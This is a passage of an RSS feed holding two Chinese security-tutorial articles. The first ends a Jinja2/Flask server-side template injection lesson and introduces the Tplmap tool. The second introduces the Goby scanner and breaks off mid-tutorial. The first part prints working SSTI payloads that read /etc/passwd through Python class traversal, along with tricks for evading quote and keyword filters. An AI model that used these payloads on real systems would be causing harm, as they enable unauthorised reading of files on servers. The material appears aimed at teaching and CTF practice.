class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subclasses&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;POST:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mro&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subclasses&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;7️⃣&lt;/p&gt;&lt;p&gt;过滤引号 &amp;#34;&lt;/p&gt;&lt;p&gt;request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__bases__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__getitem__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;8️⃣&lt;/p&gt;&lt;p&gt;一些关键字被过滤。&lt;/p&gt;&lt;p&gt;&lt;b&gt;base64编码绕过&lt;/b&gt;&lt;br/&gt;用于__getattribute__使用实例访问属性时。&lt;/p&gt;&lt;p&gt;例如，过滤掉 __class__ 关键词&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__getattribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;X19jbGFzc19f&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;/etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;字符串拼接绕过&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;p&quot;&gt;{{[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__getattribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__c&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;lass__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;/etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;fm&quot;&gt;__getattribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;__c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;lass__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;Tplmap🔱&lt;/h2&gt;&lt;blockquote&gt;服务器端模板注入和代码注入检测与开发工具&lt;/blockquote&gt;&lt;p&gt;一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。&lt;/p&gt;&lt;p&gt;&lt;b&gt;使用💢&lt;/b&gt;&lt;/p&gt;&lt;p&gt;获取：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/epinna/tplmap&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/epinna/tplma&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装第三方依赖：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pip install -r requirements&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Tplmap 不仅利用了文件系统的漏洞，而且还具有使用不同参数访问底层操作系统的能力。以下屏幕截图显示了可用于访问操作系统的不同参数选项。&lt;/p&gt;&lt;p&gt;以下命令可用于测试目标URL中的易受攻击的参数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./tplmap.py -u &amp;lt;&amp;#39;目标网址&amp;#39;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行该命令后，该工具会针对多个插件测试目标 URL 以查找代码注入机会。&lt;/p&gt;&lt;p&gt;有关 &lt;b&gt;SSTI&lt;/b&gt; 的内容就简单介绍到这里，向作者致敬。更多有关内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-26-93746437</guid>
<pubDate>Tue, 26 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>Goby：最炫酷的攻击面分析工具【虾虎鱼？】</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-25-93532753.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/93532753&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56035f3befedb7f7a48237035226751a_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;goby（虾虎鱼）？？？&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f66e726bb0d2816b8045afbe52a639c1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;328&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;500&quot; data-original=&quot;https://pic2.zhimg.com/v2-f66e726bb0d2816b8045afbe52a639c1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f66e726bb0d2816b8045afbe52a639c1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;328&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;500&quot; data-original=&quot;https://pic2.zhimg.com/v2-f66e726bb0d2816b8045afbe52a639c1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-f66e726bb0d2816b8045afbe52a639c1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;虾虎鱼是虾虎鱼科各虾虎鱼种类的统称，它们每一种都有符合各自特征的名字。尽管它们看上去无一例外地傻头傻脑，而且多数身材短小，仅有几厘米长，但却是鱼类中最大的家族，已知的种类达到2100多种。虾虎鱼的最大特征是寿命短。澳大利亚大堡礁中生活着一种虾虎鱼，其寿命只有短短的59天！当然，这种鱼长得也快，它们能在3个星期内长成成体，交配产卵后死去。&lt;/blockquote&gt;&lt;p&gt;所以，这个是个傻X工具？？？&lt;/p&gt;&lt;p&gt;&lt;b&gt;NoNoNo~&lt;/b&gt;&lt;/p&gt;&lt;p&gt;它可一点都不傻，看完你就知道了。&lt;/p&gt;&lt;p&gt;用一种更高效更自动化的方式，完成暴露攻击面（Attack Surface）的分析工作。它能够发最少量的包，收集最多的情报，以一种更全面更智能的展现方式呈现出来。&lt;/p&gt;&lt;p&gt;于时，Goby 诞生了。&lt;/p&gt;&lt;h2&gt;Goby🐟&lt;/h2&gt;&lt;p&gt;Goby官网💦：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gobies.org/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;gobies.org/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;为目标建立完整的资产数据库来实现快速的安全应急响应。&lt;/blockquote&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ac94aa2af9ec59bf704253f9edc371e1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;145&quot; data-rawheight=&quot;51&quot; class=&quot;content_image&quot; width=&quot;145&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ac94aa2af9ec59bf704253f9edc371e1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;145&quot; data-rawheight=&quot;51&quot; class=&quot;content_image lazy&quot; width=&quot;145&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ac94aa2af9ec59bf704253f9edc371e1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;Goby是基于网络空间映射技术的下一代网络安全工具。它通过为目标网络建立全面的资产知识库来生成对网络安全事件和漏洞的紧急响应。&lt;/p&gt;&lt;p&gt;Goby提供最全面的资产识别.Goby预置了100,000多个规则识别引擎，可自动识别和分类硬件设备和软件业务系统，并全面分析网络中存在的业务系统。Goby提供了最快的扫描体验，对目标的影响最小，并通过非常轻的传输快速分析了与端口相对应的协议信息。 &lt;/p&gt;&lt;p&gt;除了Goby的预设漏洞外，Goby还提供了一个可自定义的漏洞扫描框架，并激励大量网络安全从业人员提供POC，以确保持续的紧急响应能力。&lt;/p&gt;&lt;p&gt;&lt;b&gt;当前支持哪些协议？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Goby预置了200多种协议识别引擎，涵盖网络协议，数据库协议，IoT协议，ICS协议等，可通过非常轻的传输快速分析与端口相对应的协议信息。&lt;/p&gt;&lt;p&gt;&lt;b&gt;当前预设了哪些漏洞？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;RDP漏洞，反序列化漏洞，涵盖Weblogic，Tomcat的最严重的漏洞，例如各种设备的默认帐户等。&lt;/p&gt;&lt;p&gt;&lt;b&gt;功能集群📕（你想要的，它都有~）&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;最丰富的设备规则集（支持超过100,000个设备和业务系统）&lt;/li&gt;&lt;li&gt;最轻量级协议标识（200多种协议识别引擎）&lt;/li&gt;&lt;li&gt;基于丰富的攻防经验进行端口分组（覆盖1-65535端口）&lt;/li&gt;&lt;li&gt;基于社区每日更新的漏洞框架（跟进社区更新，可自定义）&lt;/li&gt;&lt;li&gt;最全面的默认密码检测（1000多种设备帐号密码）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;网络空间映射&lt;/b&gt;&lt;/p&gt;&lt;p&gt;首先分析目标网络IT资产的规则来建立知识库，这是一项新技术，可以在发生安全事件时在最短时间内管理安全紧急情况。与传统的端口扫描和漏洞扫描不同，Goby仅在较小的受影响区域处理漏洞紧急情况，因此此方法最快，对目标网络的影响最小。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2f1daee0b73643c684bfc8573828f8fa_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;760&quot; data-rawheight=&quot;448&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;760&quot; data-original=&quot;https://pic3.zhimg.com/v2-2f1daee0b73643c684bfc8573828f8fa_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2f1daee0b73643c684bfc8573828f8fa_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;760&quot; data-rawheight=&quot;448&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;760&quot; data-original=&quot;https://pic3.zhimg.com/v2-2f1daee0b73643c684bfc8573828f8fa_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2f1daee0b73643c684bfc8573828f8fa_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;报错解决（请在使用之前看❗）&lt;/h2&gt;&lt;p&gt;1️⃣&lt;/p&gt;&lt;p&gt;遇到这种情况咋办？？？&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3c2646d0db065a2caac9b565cca6b6db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1152&quot; data-original=&quot;https://pic4.zhimg.com/v2-3c2646d0db065a2caac9b565cca6b6db_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3c2646d0db065a2caac9b565cca6b6db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1152&quot; data-original=&quot;https://pic4.zhimg.com/v2-3c2646d0db065a2caac9b565cca6b6db_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3c2646d0db065a2caac9b565cca6b6db_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;请下载适用于 Windows 的 pcap：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nmap.org/npcap/dist/npcap-0.9983.exe&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https&lt;/a&gt;:&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nmap.org/npcap/dist/npcap-0.9983.exe&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;//nmap.org/npcap/dist/npcap-0.9983.exe&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安装后再次运行 Goby.exe 即可。&lt;/p&gt;&lt;p&gt;2️⃣&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-abc8ce6b0dc5db4b5f037473570c4e95_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1152&quot; data-original=&quot;https://pic2.zhimg.com/v2-abc8ce6b0dc5db4b5f037473570c4e95_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-abc8ce6b0dc5db4b5f037473570c4e95_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1152&quot; data-original=&quot;https://pic2.zhimg.com/v2-abc8ce6b0dc5db4b5f037473570c4e95_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-abc8ce6b0dc5db4b5f037473570c4e95_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;无法扫描当前接口，前往【设置】进行代理设置。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7b7d518f4de11627a9abed4c8ef82670_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;950&quot; data-rawheight=&quot;603&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;950&quot; data-original=&quot;https://pic1.zhimg.com/v2-7b7d518f4de11627a9abed4c8ef82670_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7b7d518f4de11627a9abed4c8ef82670_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;950&quot; data-rawheight=&quot;603&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;950&quot; data-original=&quot;https://pic1.zhimg.com/v2-7b7d518f4de11627a9abed4c8ef82670_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7b7d518f4de11627a9abed4c8ef82670_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;使用💨（环境：Windows）&lt;/h2&gt;&lt;p&gt;  下载地址🌈：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gobies.org/goby-win-x64-1.4.76.zip&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;gobies.org/goby-win-x64&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;-1.4.76.zip&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;下载后解压即可使用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ffee5b2f18fe3747bc543e73fe7d99fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1152&quot; data-original=&quot;https://pic3.zhimg.com/v2-ffee5b2f18fe3747bc543e73fe7d99fe_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ffee5b2f18fe3747bc543e73fe7d99fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1152&quot; data-original=&quot;https://pic3.zhimg.com/v2-ffee5b2f18fe3747bc543e73fe7d99fe_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-ffee5b2f18fe3747bc543e73fe7d99fe_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;友好性设置，左下角，切换为中文模式。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-723e49654a76a8dcf2c707c052924ad9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;150&quot; data-rawheight=&quot;229&quot; class=&quot;content_image&quot; width=&quot;150&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-723e49654a76a8dcf2c707c052924ad9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;150&quot; data-rawheight=&quot;229&quot; class=&quot;content_image lazy&quot; width=&quot;150&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-723e49654a76a8dcf2c707c052924ad9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;Scan【扫描】&lt;/h2&gt;&lt;p&gt;我们以 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//testphp.vulnweb.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;testphp.vulnweb.com&lt;/a&gt; 作为目标，进行【General】常用端口扫描。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c142a823b7e46121c7e96d4c7882aa4b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;676&quot; data-rawheight=&quot;446&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;676&quot; data-original=&quot;https://pic4.zhimg.com/v2-c142a823b7e46121c7e96d4c7882aa4b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c142a823b7e46121c7e96d4c7882aa4b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;676&quot; data-rawheight=&quot;446&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;676&quot; data-original=&quot;https://pic4.zhimg.com/v2-c142a823b7e46121c7e96d4c7882aa4b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-c142a823b7e46121c7e96d4c7882aa4b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;点击【开始】：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-088d61c2866f2bcb8f6637076998df9c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1152&quot; data-original=&quot;https://pic1.zhimg.com/v2-088d61c2866f2bcb8f6637076998df9c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-088d61c2866f2bcb8f6637076998df9c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb 